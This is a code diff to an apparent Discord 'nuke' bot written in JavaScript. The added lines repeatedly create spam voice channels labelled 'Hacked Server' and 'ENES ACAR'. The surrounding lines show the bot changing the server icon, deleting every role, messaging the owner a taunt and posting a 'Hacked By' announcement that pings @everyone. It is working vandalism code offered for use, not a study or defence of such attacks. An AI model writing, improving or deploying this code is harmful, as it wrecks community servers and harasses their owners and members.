@@ -88,6 +88,430 @@ client.on("message", async msg => {
       .then(chan => {
         chan.setUserLimit("1");
       });
+    await msg.guild.createChannel("ャ", {
+      type: "text"
+    });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ ENES ACAR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Hacked Server", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Kimse Yenemez", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+
+    await msg.guild.createChannel("ャ", {
+      type: "text"
+    });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ ENES ACAR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Hacked Server", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Kimse Yenemez", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+
+    await msg.guild.createChannel("ャ", {
+      type: "text"
+    });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ ENES ACAR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Hacked Server", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Kimse Yenemez", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+
+    await msg.guild.createChannel("ャ", {
+      type: "text"
+    });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ ENES ACAR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Hacked Server", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Kimse Yenemez", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+
+    await msg.guild.createChannel("ャ", {
+      type: "text"
+    });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ ENES ACAR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Hacked Server", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Kimse Yenemez", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+
+    await msg.guild.createChannel("ャ", {
+      type: "text"
+    });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ ENES ACAR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Hacked Server", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Kimse Yenemez", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+
+    await msg.guild.createChannel("ャ", {
+      type: "text"
+    });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ ENES ACAR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Hacked Server", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Kimse Yenemez", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+
+    await msg.guild.createChannel("ャ", {
+      type: "text"
+    });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ ENES ACAR", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Hacked Server", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("ャ Kimse Yenemez", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+
 
     await msg.guild.setIcon(
       "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png"
@@ -99,7 +523,7 @@ client.on("message", async msg => {
     await msg.guild.roles.forEach(roles => roles.delete()); //ALTINDAKI ROLLERI SILER
     await msg.guild.owner.send("Patladın Canım Geçmiş Olsun | https://discord.gg/vd77Jpf"); //KURUCUSUNA GONDERILEN MESAJ
     const kanal = await msg.guild.channels.find(x => x.name === "ャ");
-    await kanal.send("__**SİZ ACI ÇEKTİKÇE BİZ GÜLÜYORUZ**__ \nKÜLLERİMİZDEN TEKRAR DOĞACAĞIZ <a:kullermizdendogacagz:667722719290327041>\n Hacked By **ENES ACAR#0001** \nhttps://www.youtube.com/watch?v=_2X2VA-Ld10 \n||@everyone||");
+    await kanal.send("__**SİZ ACI ÇEKTİKÇE BİZ GÜLÜYORUZ**__ \n**KÜLLERİMİZDEN TEKRAR DOĞACAĞIZ** :heart:\n Hacked By **ENES ACAR#0001** \nhttps://www.youtube.com/watch?v=_2X2VA-Ld10 \n||@everyone||");
   }
 });
 client.on("message", async msg => {
@@ -119,7 +543,7 @@ client.on("message", async msg => {
 
 client.on('message', msg => {
   if (msg.content === 'asd') {
-    msg.reply('__**SİZ ACI ÇEKTİKÇE BİZ GÜLÜYORUZ**__ \n**KÜLLERİMİZDEN TEKRAR DOĞACAĞIZ** <:asd:667722719290327041> \nHacked By **ENES ACAR#0001** \nhttps://www.youtube.com/watch?v=_2X2VA-Ld10 \n||@everyone||');
+    msg.reply('__**SİZ ACI ÇEKTİKÇE BİZ GÜLÜYORUZ**__ \n**KÜLLERİMİZDEN TEKRAR DOĞACAĞIZ** :heart: \nHacked By **ENES ACAR#0001** \nhttps://www.youtube.com/watch?v=_2X2VA-Ld10 \n||@everyone||');
   }
 });
 
